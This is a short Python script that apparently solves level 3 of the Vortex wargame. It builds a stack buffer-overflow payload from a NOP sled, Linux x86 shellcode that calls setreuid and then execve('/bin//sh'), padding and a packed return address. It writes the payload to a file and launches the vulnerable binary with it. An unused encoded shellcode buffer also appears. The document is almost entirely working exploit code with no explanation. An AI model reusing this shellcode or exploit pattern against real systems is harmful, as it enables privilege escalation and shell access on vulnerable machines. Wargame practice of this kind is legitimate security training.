import os
import struct
def main():
    buf =  ""
    buf += "\xbd\x11\x45\xf6\xea\xda\xd7\xd9\x74\x24\xf4\x58\x2b"
    buf += "\xc9\xb1\x11\x31\x68\x12\x83\xe8\xfc\x03\x79\x4b\x14"
    buf += "\x1f\x13\x58\x80\x79\xb1\x38\x58\x57\x56\x4c\x7f\xcf"
    buf += "\xb7\x3d\xe8\x10\xaf\xee\x8a\x79\x41\x78\xa9\x28\x75"
    buf += "\x67\x2e\xcd\x85\xfb\x4f\xb9\xa5\xd4\xea\x35\xc6\x05"
    buf += "\x83\xda\x7a\x2e\x0e\x5d\x25\xbe\xb1\xee\xaa\x11\x44"
    buf += "\x7e\x3e\x1a\xcd\xf8\x8a\xe2\x5a\xaa\x7b\x03\xa9\xcc"
    shellcode="\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
    payload_size = 132
    addr = struct.pack("<L",0x080482a4)
    payload = "\x90"*40 + shellcode + "\x90"*(payload_size-40-len(shellcode)) + addr
    #print len(payload)
    fp = open("test.txt","wb")
    fp.write(payload)
    fp.close()
    os.execv("/vortex/vortex3",("/vortex/vortex3",payload))
    pass
main()
